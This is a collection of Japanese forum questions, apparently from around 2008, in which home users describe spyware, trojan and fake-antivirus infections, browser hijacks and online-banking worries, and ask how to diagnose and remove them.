ネットバンクを利用しようと思っています。 そこでパスワードやログを盗まれないようにしたいのですが、スパイウエア、ウイルスの対策をした上で、今はIEを使っているのですがwindows上でもっとも安全なブラウザは何でしょうか？ それとIE.6とIE.7ではやはり７の方が安全ですか？ 今はIE.6を使っているのですが、7は重たくなりそうで使っていません。 それから、サービスパック３の適用は早いほうがいいですか？ 不具合もあるので後の方がよいという意見もあるようなのでいまはサービスパック２使っています。 回答よろしくお願いいたします。
　Trojan Hunterというソフトでスキャンしたら Found trojan file: C:\WINDOWS\I386\NOTEPAD.EX_/notepad.exe (TrojanDownloader.Small.1485) と結果がでました。このファイルNotepadの起動ファイルみたいだし、 これを削除していいものかどうか、誤認の可能性はあるのでしょうか？ 詳しい諸先輩どなたかよろしくご教授お願いいたします。
お手上げです。助けてください。 sony vaio VGN-FS50B(2004年くらい？） norton antivirus 2005 ad aware SE personal 普段はLunascape４あたりを使ってるのでIEはつかってないのですが、使ってないのにたまにこんなことがあって困ってます。 症状：複数あります。。。 ・IE6を起動すると、ads by dcadsやmediafileshost への誘導がはじまる ・同時にIE6のCPU占拠率が９９％ などの症状からtrojan Vundoのウイルスの可能性が高いと判断したため、 http://wiki.higaitaisaku.com/wiki.cgi?action=SEA … の通りにやってみたところ、無事IE6が使えるようになったのですが、また以下の症状が。 きっかけはIE6を起動し、しばらくしたら… ・IEのウインドウが次々に現れ操作不能 ・Cドライブの空き容量が短時間で200Mに… 助けて下さい
仕事でインターネットをする際にFirefox/3.0.3を使っているのですが、 サイトを開こうとするとハングアップ（画面がフリーズ）してしまい困っています。 ハングアップするサイトは特に決まっていないようです。 また、ウイルス対策としてウイルスバスター2009を使用しています。 2009をダウンロードしてから「Trendプロテクト」というツールバーが 出るようになったので、もしやこれが原因でしょうか？ この件に詳しい方がいらっしゃいましたら教えてください。 よろしくお願いします。
昨日から突如表れたmirarツールバーの削除方法を教えてください。 過去の質問、回答方法でも消えません。 あまりPCには詳しくないのですが分かりやすい方法があれば教えてください。 x-cleaner、WINDOWS DEFENDERでは出来ませんでした・・・ よろしくお願いします。
早速ですが困っています。 Ad-Aware2008のスキャン結果で下記の結果でたのですが これは、スパイウェアでしょうか？？？ Category Mis TAI 4 IP Address : 127.0.0.1 Host Name : THEREALSERCH.COM : GREG-SEARCH.COM : APPROVEDLINKS.COM : VSE-MOE.BIZ : AIFIND.INFO : I-LOOKUP.COM : IE-SEARCH.COM : ITSEASY.US 以上です。 ノートン2008、Spybot 1.6 でスキャンしても何も出ません。 非常に困っています、どなたかご指導下さい。 よろしくお願いします。 ＯＳはＸＰです。
ノートンのトランザクション保護の部分に 状態：遮断しました プログラム：system32/ctfmon.exe 動作：キーローガー とあるのですが、これはウイルスに感染しているのでしょうか？ どういう状態なのでしょうか？
お世話になります。 数日前からですが、画面右下の常駐ソフトのアイコンが並ぶ所に WindowsDefenderのアイコンがびっくりマーク付きで 出っぱなしになりました。 そこをクリックすると、更新プログラムが細心ではないと言ってくるので 最新にしようとすると、すでに最新であるとのメッセージ。 しかし、びっくりマーク付きのアイコンは出たままです。 WindowsUpdateで確認しても、更新する内容は無し。 ＯＳがＶＩＳＴＡのため、削除方法も分からず、 ダウンロードセンターでダウンロード、再インストールしようにも できないとはねられます。 何となく、他のスパイウエア対策ソフトとの競合を疑っていますが 今までは正常で、特に問題なしでした。 何か対処法のアドバイスをお願いします。 以下、環境を書いておきます。 ＯＳ：ＶＩＳＴＡ　Ultimate（×８６）ＳＰ１ ＰＣ：自作（チップセットＰ３５　ＨＤＤはRAID ０構成） メモリ：４Ｇ ウイルス対策ソフト：カスペルスキーInternet Security７．０１ スパイウエア対策ソフト：ＡＤ－Ａｗａｒｅ２００８フリー 　　　　　　　　　　　　SpyBot S+D です。他に何か補足情報が必要でしたらお知らせください。 なお、できればリカバリやシステムの復元はしたくないので、 他の方法があればそちらをお願いします。
さっきスパイウェアの対策のためにスパイウェアの検査をしたらひとつ疑わしいものがあるということで削除しました このパソコンでネットバンキング（セブン銀行、ゆうちょ銀行）や他銀行の口座開設やimiなどのアンケート登録のため個人情報を入力していました。最近は急にインターネットで検索中に文字入力不可になったり無線ラン接続がうまくいかない、いまは有線ランにしています ゆうちょ銀行のログインで１回だけキーボードで直で入力もしかしたらセブン銀行も入力したかもしれません。無料でいろいろダウンロードした事はあります。音楽とか 個人情報が流失した恐れはあるでしょうか。ネットバンキングの方はEメールアドレスを登録していて今までに疑わしい取引等はありません ヤフーのメールアドレスの迷惑メールが最近増えたような気がします いろんなとこに登録したからかもしれません 携帯のアドレスもアンケートのにしか入力してないのに一時期かなり来ました　今はアドレスの入ったメールは受信しないようにしてるので着ません　　　　　　　　　　　　 スパイウェアがあったら必ず被害にあうのでしょうか このまま何もしなくていいでしょうか 教えてください
以前からネット上で知り合った方がストーカーになってしまい、悩まされています。 相手は自分のメールアドレスを知っているので、頻繁にメールを送ってきたりしてきます。 その中のメールであるURLが貼ってあり、ついクリックしてしまいました。 そこには風景の写真が載ってあるページに飛んだだけだったんですが・・。 今ではクリックしただけで、クッキーを盗まれてしまったりスパイウェアを含ませる事ができると聞いて不用意にクリックした事を後悔しています。 自分が一番恐れているのは、パソコン内に貴重なレポートとデジカメの写真がパソコンの中に入っているということです。 指定したURLをクリックしただけで自分のパソコンに進入し、写真等を持っていってしまうという事は果たして可能なのでしょうか？ 丁度そのURLをクリックした時、手違いでパソコンのウィルス対策とスパイウェア対策ソフトが無効になっていましたので余計に心配です。（無効になっていると気づいたのは数週間後でした） そもそも人のパソコンの中に入り込むという事は何故可能なのでしょうか？IPさえわかっていれば入り込まれてしまうのでしょうか？ スパイウェアと少し趣旨が違う質問で、わかりにくいかもしれませんが、どうぞよろしくお願いいたします。
こんにちは　よろしくお願いします。 最近パソコンの調子がよくないと思っていたら　今日ワードのファイルを開こうとしたら　全部の内容が　なくなっていて Hack by debugger !!! という文字が　全てのファイルに・・・。 これは　スパイウエアなんでしょうか？ セキュリティーは　ＡＶＧのフリーのを使っていました。 ２－３日前に　ＳＰＹ　ＢＯＴ　と　ＡＤ　ＡＷＡＲＥ　を入れて　スキャンしたのですが　全部　削除できていたのですが・・・・。 今日やっても　スキャンは　おめでとうございます！スパイウエアは　ゼロです、と出てきます。 ＡＶＧ　には　ＡＵＴＯＲＵＮなんとかいう　ウイルスが　ずっと毎日スキャンで出てきて　削除できません。 実は　２－３ヶ月前に　クレジットカードの不正使用をされたのですが　パソコンですきミングされたという可能性は　あるのでしょうか？ 怖いので　どうか教えてください。 よろしくお願い致します！！！
http://www.jp-security.net/01touchou-taisaku/ten … テンペスト（電磁波盗聴）という技術で ディスプレイの映像、作業風景など盗み見できる（ネット銀行のログイン時のソフトウェアキーボードが逆効果、顧客の情報流出、企業秘密流出） キーボードの打ったキーを盗聴できる（各パスワードがばれる） たくさんのパソコンが集まった部屋でも個々のパソコンを区別して盗聴できます。機器も100万程度とそれほど高くないです。みなさんの会社で対策してるんですか？上司に聴いてください。してないんなら強者によってトウサンは自由自在です。所詮この世は弱肉強食、弱いものは強いものの糧になります。
ＯＳ：Windows Vista、ウィルスソフト：McAfee（毎日データ更新済）です。 今日ＰＣのデータをフルスキャンしたのですが(フルスキャンは２週間に１度実施)、あるZipファイルの中の「wanpacket.dll」というファイルが、McAfeeに突如ウィルスとして認識・隔離されました。 ちなみにこのZipファイルは、フリーのゲームソフトを、一旦遊ばなくなったので、バックアップとしてZip形式に圧縮して、保存していたものです。 ですが、このZipファイルは、今のままの状態で半年以上前からＰＣ内に置いていたので、「なぜ今ごろ突然ウィルス認識するの？」といった思いです。 それで、このDLLファイルの役割がよく分からないのですが、これは本当に、即ウィルスと判断されるべきファイルなのでしょうか？ 個人的にはMcAfeeの誤検出、もしくは過剰検出だと思っているのですが・・・。 なお参考までに申し添えますが、今回隔離された「wanpacket.dll」は、SYSTEMフォルダで発見されたわけではありません。あくまでZipファイル内です。 教えてください。よろしくお願いします。
つい2日前に、ウイルスにかかってOSを再インストールしたばかりなのですが、 早速「WebHancer」というスパイウェアがいつの間にか入り込んでいました… それはコントロールパネルから削除できるものだと知り、 削除した後に、プログラムファイルからも 「WebHancer」関連のものは全て消したはずなのですが またしばらくしたらコントロールパネルにあるのです・・・ セキリュティソフトはキングソフト社製の無料のやつを使用していますが、 ちゃんと「WebHancer」はそれにひっかかってくれるのですぐに削除ができます あまりPCには詳しくないもので、 もし解決方法を知っている方がいらっしゃいましたら どうか宜しくお願いいたします。
はじめまして。 うちには、パソコンが一つあり、新たに私専用のパソコンを購入することとなりました。 そこで、2台共ネット接続するためにはブロードバンドルータが必要みたいなのですが、それを介してウィルスやスパイウェアなど感染したりしますか？ 私のほうは　NETBANKにアクセスしたりするので、何かあった場合すごく困ります・・・。 主人のパソコンは　ウィルスバスターを入れていますが（もちろん私のほうも入れるつもりです）　あやしいサイト（Ｈな）に行ってるみたいだし、ｐ２ｐも　してそうです。 ウィルスバスターで、すべてのウィルス、スパイウェアを駆除できないのでしょうか？ また、ルータから侵入してくることはありますか？
昨年、新品でPCを購入してからこの1年間ずっとインターネットの接続が遮断される、途切れるといった症状に見舞われてます。 症状としては ・サイトを観覧中、頻繁に「ページ読み込みエラー」が出る。Ｆ５で回避。(FireFoxの場合) (IEだと、「ページを表示できません」) ・起動後、２～4時間後位で完全にネットに接続できなくなる。どのアプリケーションも。 (無線、有線のいずれも) 結局再起動で、問題は回避できるのですがメールの途中で遮断…なんてこともあって困ります。 東芝にメールで問い合わせたところ。 ・無線ドライバの再インストール ・東芝アプリケーションのバージョンアップ ・BIOSの標準値設定 ・この機種修正モジュール ・ファイアウォールは有効になっているか ・常駐セキュリティーソフト、アプリケーションの停止 以上がアドバイスされましたが、そんなこととっくに実行済みです。 電話で問い合わせると、こちらでは打つ手は無いと言われ…。 最終手段のリカバリしかないと。 ですが、リカバリは1%もやる気はありません。 ですが、新品で購入したときからの症状です。 ハードウェアの故障を疑わないのは何故でしょうか？ 他に原因はスパイウェアやウイルスと言ったものしか無いと思います。 プロバイダにも問い合わせ済みです。 このPCだけがこのような症状です。 さて本題ですが、 インターネットの接続を完全に遮断したりする、ウイルスやスパイウェアは存在するのでしょうか？ 修理を依頼した方が無難でしょうか？ ご指摘など御座いましたら、よろしくお願いいたします。 若干カテ違いかもしれませんが申し訳ないです。 PC 東芝　dynabook Satellite TXW/66CW（PATW66CLP10W） CPU：celeronM　440 OS：windows　vista　32bit　home　premium HDD：80GB メモリ：2G チップセット：943GML Express 超低スペックですが詳細はこちらでお願いします。 http://www3.toshiba.co.jp/jdirect/catalog/satell …
外国のサイトにいったら誤ってAntivirus　Lab　2009をインストールしたみたいです。(2008.9.15)30秒ぐらいですぐにWindows Antivirus 2008を購入して下さいみたいな（画面全部英語で理解できません）サイトに飛ぶように警告のポップアップが右下にでてきます。プログラムの削除と追加では検知されなくてアインストールができません。あと、インターネットを開くとInternet SecurityのHPが開き左上にセキュリティーレベルが１０段階中４と表示される画面がでてきます。Ｃドライブをアバストの検査に掛けてもウイルスが見つけれません。 削除するにはどうしたらよいでしょうか？お手数ですがご指導願います。
怪しいページに行くと自分のPC内からヤフーなどで使われているクッキーは盗まれることはありますか？ 盗めるとなると勝手にウエブメールとかにログインできてしまいませんか？ また、USBメモリなどにクッキーをにコピーして他のPCに移行すれば同じように使えてしまいますか？
イーバンクに口座を持ってます。 セキュリティボードでのログインが出来なかったので、調べたら、 マカフィーの「フィッシング対策を一時オフ」する事でログイン出来ると知りました。 それに気付かずセキュリティボードではなく直接入力してログインしましたが大丈夫でしょうか。 一応、基本的なスパイウェア対策はしています。 また、ログインしても、自分の携帯電話宛にパスワードが来るように設定しています。 （このパスがないとログインしても先に進めないようになってます） 今度ログインする時は、どのような方法をとるのが一番安全でしょうか？ マカフィーの機能をオフするタイミング等があれば教えて下さい。 というか、オフするのが怖いのですが。。 他のネットバンクではセキュリティボードの使用で問題なくログイン出来ました。
PCトラブルに関してご質問させていただきます。 現在使用しているPCですが、windows XP、ウイルスソフトはZEROを使用しております。 今日になって、いきなり「このパソコンから外部へ通信しようとしているのでブロックしました。」とメッセージが出始めました。 内容は以下のとおりです。 ブロックしました。 - このパソコンから外部へ通信しようとしましたがブロックしました。 ルール: 規定 リモートコンピュータ: 192.168.3.255 (138) ローカルコンピュータ: 192.168.3.2 (138) プロトコル: UDP この見方としましては、リモートコンピューターとは「遠隔操作しているPC」という解釈で良いのでしょうか？また、ローカルコンピューターとはどう言った意味合いでしょうか？ ちなみに、IPアドレスを調べてみましたら「イタリア」となっておりました。 特に、おかしなサイトを訪問した訳でもないので「何で？？」という思いで一杯です。 まだまだPCセキュリティに関して初心者ですので、諸先輩方、このリモートコントロール？の根源となっているデータ削除の方法をご教授ください。 どうか宜しくお願いいたします。
ウィルスかスパイウエアかわからないファイルに悩まされています。 ウィルスソフト「カスペルスキー　InternetSecrity7.0」でスキャンしても検知されませんが、Dosプロンプトで"attrib -r -h -s c:\ /a"とすると、l1lyxiy1.exe、mxuclt.exeが存在し、autorun.infもあります。 Cドライブをダブルクリックすると、新しいウィンドウで開くようになり、Yahoo!メッセンジャーのような常駐通信ソフト等に不具合を出しています。 セーフモードのコマンドプロンプトで、 attrib -r -h -s c:\・・・・.exe del c:\・・・・.exe と削除しても消えず、親玉がどこにあるのか？わからずにリカバリーします。 しかし、USBメモリー等の中のファイルを開いたり何かの拍子でPCに進入してしまいます。 USBメモリ等も開く際に必ず見て削除してから開くようにしているのですが。。。 同じような症状で対応策をご存知の方いらっしゃいませんか？
起動の度に、時計が２００２年１月１日に改ざんされ、復元ポイントが不能にされるのは、スパイウェアが原因と考えられますか？ ＯＳ：ＸＰ 常駐セキュリティソフト：avast! spybotーS＆D、ad-aware、avast! でそれぞれスキャンをかけ、駆除後の状態です。
初歩的な質問で済みませんが、短刀直入に 　ここ一年の間で、MACパソコンでスパイウエアの被害はどの位あるのでしょうか？ 　10年来マックユーザーですが、ウイルスも一度だけ遭遇しただけで、それもかわいいものでした。　ところでスパイウエアはどの位存在しているのでしょうか？ 　気になっているのは、私が知らないだけで、実は深刻な問題をウインドウズ同様におよぼしているのであれば、検出ソフト等も教えて頂ければと思います。 宜しくお願い致します。
　質問させて頂く前に1つだけ申し話上げておきます。 1台目にNECのノートパソコンを買い当時は当然最新版のSpywareBlatserをインストールして最新のUpdateファイルを落として「protection」を最新版で使用していました。 　ある理由から2台目のパソコンを買う事になり富士通のノートパソコンを買い当然spyware Blasterは最新版にしました。 それから、2台目の富士通をずっと使い続けており最新版のプログラムが出るたびに最新版を落としてインストールして「Protection」を最新版にしてきまして、現在はバージョンは4.1.0.0、protectionも最新版にして正常に起動しています。 　 　ですが、再び1台目のNECを使う事になりバージョンが3.0.5.1なのでprotectionを解除してから古いSpywareBlasterを削除。 最新版の4.0.1.1をダウンロード、インストールしてから毎回私は最新版のUpdateを落とす前にprotectionを有効にしてブロックできる状態にしてから最新版にUpdateしています。 　いつも通りにprotectionを有効にしてから「Updates」の「Cehck for Updates」をクリックした時の事です。 この場合普通ならば最新版がUpdateされていないかサイトへ確認しに行き最新版が有ればダウンロードが開始、無ければ「現在はUpdateは有りません」とのメッセージが出てきて終わりですが、当然最新版のUpdateの更新がありますので普通にダウンロードされるのかと待っておりましたがダウンロードが始まらず、何と「Cehck for Updates」のボタンをクリック直後ボタン全体に斜線が出てきてフリーズしてしまいました。 　その後何度試してみても全く同じ症状が出るのでプログラム自体 (が正常にインストール出来ていないか問題がある) が正常にインストールできなかったのでボタン全体に斜線が出てきてアップデートが出来ないのだと思い「protection」を解除、SpywareBlasterを削除後再インストールして「protection」を有効、「Check for Upadates」をクリックしてみましたが相変わらずボタン全体に斜線が出てきて最新版にアップデートする事が出来ませんでした。 　今までこんな可笑しな現象は一度も起こった事がありませんので、一体何が原因で「Check for Updates」ボタン全体に斜線が出るのか全く分かりません。 　因みにですが、ウイルス対策ソフトのAviria Antivir Personal‐Free Antivirus、スパイウェア対策ソフトのWindows Defender、Spybot Searc & Destroy、Ad-Aware 2008は普通にアップデートが出来て全て最新になっています。 最新にアップデート出来ていないのはSpywareBlatserだけです。 　私と全く同じく「Check for Updates」ボタンをクリックするとボタン全体に斜線が出てきてアップデートが出来ない、或いは「Check for Updates」ボタンをクリックした後にボタン全体に斜線が出てきてフリーズしてしまうのを修正パッチか何かをSpywareBlaster本体に当てて全く出てこない様にして正常にサイトへ確認しに行き最新版のUpdateがダウンロードされ、正常にprotctionを有効にしてSpywareBlasterを最新に出来る方法をご存知の方教えて下さい？
あるサイトの投稿ボタンを押すとabout blank と表示されるようになってしまいまいた(通常は 投稿ボタンをクリックすると、別ウインドウが開くのですが、それが真っ白です）。 1. 以前からPCに入れているセキュリティソフトでスキャンすると、 　「スパイウェアを削除しました」という表示が出てスキャン終了。 2. さらに、このサイトでスキャンしましたが、何も検出されませんでした。 　http://www.shareedge.com/spywareguide/txt_online … 3.一時ファイルとクッキーの削除、IE６の再インストールもしましたが、変化なし 4.about blankが表示されるのは、このサイトの投稿ボタンを押した時だけで、他のサイトは問題なしです。 　勝手に他のサイトに飛ぶなどはありません。 これはスパイウェアなのでしょうか？削除ツールなどを紹介してある サイトもありますが、英語だと不安で使うのを躊躇してしまいます。 何か良い方法がありましたら、教えてください。
WindowsXPを使っています。 昨日から急にVISTA Antivirusというインストールした覚えの無い プログラムが立ち上がり、インターネットエクスプローラもメールも 開けなくなってしまいました。 アンチウィルスやBitDefenderを使っても取り除けませんでした。 どうしたらこのVISTA Antivirusを削除できるのでしょうか？
タイトルの通り、yahooやgoogleで弊社をキーワード検索し表示させると、「案内」「リンク」など各項目がgoogleで8項目ほど表示されるのですが、これらをクリックするとそのページに飛ばずにアダルトサイトに飛んでしまいます。 教育関連なのですが、かなり狭い業界であることと、競合相手がやくざがらみの悪質企業であるため、何か操作されているような気がしてなりません。 早急にアダルトサイトに飛ばないようにしたいのですが、どうすれば良いでしょうか。 ちなみに、状況としては、一回目アダルトサイトに繋がり、２回目は通常通り表示されます。表示されたアダルトサイトを閉じても、また違うアダルトサイトが出てきて・・・という感じです。 このせいで、資料請求がぴったりと止まってしまいました。本当に困っています。どなたか救いの手を！
今流行っているantivirusXP2009に罹ってしまいました。 気をつけていたつもりですが情けないです。 OSはXPでセキュリティソフトはESET NOD32アンチウイルス Spybot SpywareBlasterです。 出来ることをしようと、antivirusXP2009に関係あるファイルを探し、プロセス強制終了させてから削除しました。 とりあえずトレイに在るantivirusXP2009のアイコンは消えました。デスクトップ上のantivirusXP2009画面も消えました。 レジストリ削除ツールで余計なものを消し、導入しているソフトで検査しました。 ESET NOD32アンチウイルスは正常。 Spybotは１つ検出削除。スタートアップのエントリ関係。 しかし、デスクトップ上のショートカットが２つ残っています。 （削除作業のおかげか、プロパティを見ると0バイト） ファイル名で検索しても同名のファイルは見つかりませんでした。 （AV2009install_880293.exeと$$$$$$$.batの２つです） トレンドマイクロ（ウイルスバスター）の無料オンライン検査もしましたが検出項目はありませんでした。 この２つのショートカットはどうすれば消せますでしょうか。 焦って慌てて順序も関係無く削除したためだと思います。
パソコンで ・何時にメッセンジャー使用した。 ・何時ごろヤフーメールを送信した。 など、第三者に知られてしまうような スパイウェアみたいなものは 存在するのでしょうか？ 友人宅で少し困っていまして。 宜しくお願いします。
最近パソコンが不調なんです。 まず文字が日本語ではなく、訳の分からない文字で表示され、何が書いてあるか分かりません。カタカナだったり、記号だったりが混ざっているような文です。 そして時々上にテロップの様に 「Warning: possible spyware or adware infection! Click here to scan your computer for spyware and adware...」 と表示されます。そこで「Click here」というところを押しても「ページが見つかりません」になります。おそらくスパイウェアが関係しているのだと思い、スパイウェアにあったウイルスのようなものを全て削除し、「Norton Internet Security」のパソコン全体のスキャンを行なったところウイルスなどの脅威は見つかりませんでした。 にも関わらず、しょっちゅうパソコンはフリーズし、カーソルやボタンにさえ反応せず、電源ボタンを4秒以上押すという強制終了でどうにかしていますが、こんなんではろくにパソコンも出来ません。動きも遅いです。 一体どうすれば元に戻るのでしょうか？上手くパソコンが立ち上がればエクセルやワードは使えるんですが・・・
Trojan.Win32.Malware.1に感染しています、とウイルスセキュリティZEROで検出されました。 ￥WINDOWS￥sysytem32￥blphcjgoj0e549.scrのファイルが感染しているようなので、このファイルを削除したいのですが、問題ないでしょうか？　また、どのように削除すればよいのでしょうか？ 最初は、自宅のノートPC（SOTEC/WINDOWSXP）にスパイウェア警告が出たので慌ててWEBで対処法を検索。 こちらのサイトの皆様の回答などを参考に、ウイルスセキュリティZEROで手動検査をして、また、Xクリーナーでオンラインスキャンもかけましたが、警告が消えないので、さらに、レジストリを修正した結果、警告は消えましたが、上記のファイルが感染したままなのです…（会社のPCから質問させていただいてます）
ウイルス自動検知機能が以下をしても有効にすることが出来ません御指導お願いします。 　ウイルスセキュリティを最新版に更新しました 　アップデートは自動になっています
http://home2.ca.com/store/cajapan/ContentTheme/p … CAという会社ですが、ここの製品採用しているのが、米国防総省（ペンタゴン）、マイクロソフト社、米Yahoo!など有名どころばっかりなんですが。 CAアンチスパイウェア２００８の特徴が ------------------------------------------------------------------ 世界NO.1検出率、検出数、20万件以上のスパイウェアをリアルタイムに検出・削除。米国防総省も採用のスパイウェア対策をご家庭に！ ------------------------------------------------------------------ と世界NO.1と書いてあります。20万件以上のスパイウェアてのは多いんですか？みなさんどう思います？お勧めですか？
こんにちは。困っているのでわかる方、教えてください。 8月上旬にネットをしてたら 「あなたのコンピューターにウイルスが感染しました」 というようなポップが開き(英語)、VirusRemover2008というウイルス駆除ソフトが勝手に動きました。 そのソフトの結果、 「ウイルス8個に感染している。駆除するにはVirusRemover2008完全版を購入してください」 となり、クレジットカード決済の画面になりました。 ×ボタンも押せず、購入するしかない状況。 PCに入ってるVirus対策ソフトの期限が古かったのと、 本当に感染していると思ったのでついカードで購入してしまいました・・・。 その結果VirusRemover2008がインストールされたのですが 最近になり、ふとクレジットカードの情報漏洩等が怖くなりネットで調べたら 下記サイトより、怪しいソフトって事はわかりました。 http://securityresponse.symantec.com/ja/jp/enter … とりあえずソフトをコントロールパネルよりアンインストールし PCのウイルススキャンをした結果、ウイルス関連は見つかりませんでしたし ソフトを購入・DLしてから約半月間、勝手にウィンドウが開いたりするなどの怪しい動きはありませんでした。 クレジットカードの料金払いに関しては、DL時の海外サイトの請求にあったとおり 日本円にして約1万円、再来月引き落としされる予定のようです。 この代金については自の意思で購入してしまったので、社会勉強代だと思って諦めています。 この場合、あと気をつける事・安全のためにすべき事は何でしょうか？ 私としては念のためクレジットカードの再発行をしてもらおうかと思っています。 因みにこのソフトがPCにある間にクレジットカードで買い物、ネットバンクを利用しました。
PCに詳しく無いので教えて下さい。 今現在、Norton Internet Security 2008のみを入れているのですが、 スパイウェア対策ソフトも入れたほうがいいのでしょうか？？ Norton・・・だけでは、駄目でしょうか？
インターネット接続中にポップアップ画面が出てきます。 複数の種類が出てきますが、これらをなくす方法をお教えいただけないでしょうか。
コントロールパネルからファイルの追加と削除をチェックしてもオプトメディアに関連したソフトはインストールされてないんですが、オプトメディアの広告が表示されてしまします。タスクマネージャを見るとoptserve.exeが動いており、それを消すとポップアップは止まるのですが、PCを再起動するとまたoptserve.exeが復活し、広告が表示されてしまいます。 Spybot等スパイウェア除去ソフトを使っても、またWindowsの検索機能を使っても引っ掛からないんですが、どうすれば消せるんでしょうか？
恐れ入ります、お教え願います。。 ある時期から勝手に、マウスをクリックすると、中国サイトのＨＰが立ち上がるようになってしまいました。時々一気に２０コくらいＨＰが連続で立ち上がるときもございます。 これを止める方法ございましたらお教えください。 WINDOWS　ＸＰ　ＳＰ2　　ウイルスソフトはソースネクスト0　です。
先日から突然、変な表示が出るようになってしまいました。 HadodoraiBugadoというものみたいなのですが、システムに異常が・・・ などと出ます。これがウイルス？みたいなダメなものだと分かったのですがどう処理していいのか全く分かりません。 以前こちらで投稿してあったものを読んでみたのですが、 さっぱりでしたので、詳しく教えていただける方いませんでしょうか？ 本当にお願いします・・・。
パソコン素人で、どのカテゴリーに質問していいものかも解らずに質問していますが、ご容赦下さい。 先日、こちらの「教えてgoo」の「囲碁将棋カテゴリー」に掲載されていた広告から、「バリュー将棋4」という将棋ソフトを無料でインストールしました。 本来有料のソフトですが、私の見たウェブページを基に、色々な広告を送信することを条件に無料になっているようです。 このような場合、スパイウエア等の心配はないのでしょうか？ ローンの広告が頻繁にパソコン画面右下に出るので心配で質問しました。それに関連するページなんか見た記憶も無いのですが・・・。 また、危ない場合、簡単にアンインストールできるものでしょうか？
はじめまして。 家庭ユーザです。セキュリティソフトの乗り換えを検討しています。 今まではカスペを使っていましたが、他のソフトの使用感も確かめたくて、 ESET　Smart　やZone　Alarm　Security Suite　を試してみたのですが、うまくゆかず困っています。 セキュリティソフトの導入は、基本的に「セキユリティソフト未導入」の状態にリストアした状態でインストールしていますが、インストール後ウェブページの閲覧ができない状態になってしまいます。具体的には「ページを表示できません　サーバがみつからないかＤＮＳエラーです」となります。 ESET SMARTはフゥイアウォールをＯＦＦにすると見えるようになります。Zone Alamの場合はファイアウォールの設定を（高）→（中）にすると見えるようになります。 本当はどちらもデフォルトのままで問題なく使えるべきものと思うのですが、何が問題なのかわかりません。 チェックすべきポイントがあればぜひお教えいただけないでしょうか？ 参考までに当方環境を列記しておきます。 PC: Win2000 SP4 Pentium4 2.4GHz 1GB memory HDD; 80GB+120GB(70-80%空き) ローカル側TCP/IPの設定：ＩＰ、DNSともに自動取得に設定 YBB　Trio3 G+ モデム ルータ　NEC製ATERM ブラウザはＩＥ6.0.28です。 どうぞよろしくお願いいたします。
Ad-Aware 2008 Freeのファイルaaw2008.exe ですがファイルを右クリックしてプロパティを選びデジタル署名を見ると Lavasoft ABですか？この署名者名は http://lavasoft.com/index.php の会社の署名ですか？ 似せたまがい物じゃないですよね？ そもそもABってどういう意味なんですか？
「Antivirus 2008」と言う海外版のソフトがＰＣに知らない間にインストールされて、インターネットを使用出来なくなってしまいました。 Antivirus 2008 のプログラムファイル自体を削除する事も出来ません。 どなたか方法をご存知の方、教えてください！！
ウイルスに感染されて、大手の対ウイルスHPやダウンロードがうまく正常に動作しません。 感染PCにはアンチウイルスソフトを積んでいませんので、手も足もでない状況です。 どうにかして、制限を解除する事はできませんでしょうか？ 助けてください、お願いします。 ちなみにウイルスというのはSpyware detected on your computerとデスクトップに表示されるものです。 まだ、引っかかってないのですが・・・
急に回線速度が遅くなったのですが、原因がわかりません。 スパイウェアが原因だと思いこのカテゴリで質問しました。 しかしウィルススキャン、スパイボットなどでは無反応でした。 あるページを閲覧中（ゲーム攻略サイトです）リンク切れの所から 海外のページに飛ばされた直後遅くなった様な気がします。 速度測定サイトにて、通常約60Mbpsだったのが、現在約30Mbpsまで落ちてます。 当方の環境は ・OS　２０００ ・ブラウザ　IE6 ・接続　FTTH（光） ・ウィルスソフト　マカフィ 自作機です。 他にもパソコンを持っており、そちらでは約60Mbps出るので 回線関係の不具合ではないと思われます。 とりあえず試したものとしては ・AD-AWARE、スパイボット、X-Cleanerオンラインスキャン 　→検出は特に無し（スパイボットではセーフモードでもスキャンしました） ・マカフィでのスキャン　→検出無し ・エラーチェック ・デフラグ ・クッキー削除、インターネット一時ファイル削除、履歴削除 できればクリーンインストールしないで済めば助かります。 よろしくお願いします。
Webブラウザ使用中、結構な頻度でセキュリティー対策ツールにて個人情報保護ブロックが掛かります。 対策ツールで個人名・電話番号・クレジット番号等設定してますが、こうも頻繁にブロックが掛かるとは… これってgoogle-analytics等のウェブ解析ツールの仕業なんですよね？ ブロックが掛かっていれば安心という認識でよろしいのでしょうか？
間違ってアダルトサイトの有料画面をクリックしたところ請求画面が５分間隔で表示されます。これを消したいのですが。
USB2.0接続の外付けHDDを使用しています。時々、まったくアクセスしていないのにカリカリとHDをスキャンしているような音を立てます。 マルウェアにやられたかなと、下記セキュリティ・ソフトでPC全体をスキャンしてみましたが（直前に定義ファイル更新）、すべて結果はシロでした。 NOD32 V3.0（常駐） Ad-Aware 2008 Spybot S&D 1.6（Tea-Timer不使用） SUPERAntiSpyware SpywareTerminator（常駐） A-Squared free これらのソフトで検出できないマルウェアが活動している可能性は考えられますか。 また、下記の常駐ソフトを使用していますが、これらが外付けHDDを自動的にスキャンすることがありますか。 COMODO Firewall Pro SpamMailKiller Spyware Blaster Googleデスクトップ もしくはUSB2.0の仕様で、随時HDDにアクセスするのでしょうか。内蔵HDD（起動ディスクとスレーブHDD）には、アクセスしている様子がありません。 使用OSはXP Pro SP3です。よろしくご教示ください。
Googleで"Click here! want to know more about "をフレーズ検索すると表示される一連のURLをクリックしたら、フォルダの画面が表示され、何やらスキャンが実行されました。 日本語OSなのですが、英語の警告が表示されSpy wareが云々と出てきます。 怖くなってブラウザの画面を閉じましたが、正体がわからず気持ち悪いです。何かご存知の方いらっしゃいませんか？
サイトへアクセスしログインする為にID,パスワードを入力し送信！ すると警告案内で　　「セキュリティで保護されていない接続へリダイレクトされようとしています　　現在のサイトへ送信中の情報はセキュリティで保護されていないサイトへ再送信される可能性があります　続行しますか？」と表示がでます　ウイルスセキュリティZEROは導入済みです 警告表示はあまり、気にせずログインしても問題ないものか、それともやるべき対策があるのか・・・ パソコンにあまり詳しくなく、ウイルス対策ソフトを入れてあれば困ることはないと思っていましたので・・・今、ネットでの買い物も不安で出来ずに非常に困っています どうか、回答よろしく御願いします
はじめまして。 PCがスパイウェアに感染したというメッセージが出てすぐさま スパイウェア駆除ソフトで駆除して、再起動したら再びスパイウェアに 感染したというメッセージが出て、結果駆除が出来ないでいます。 どうすれば、完全に駆除できるのでしょうか？ 教えて下さい。
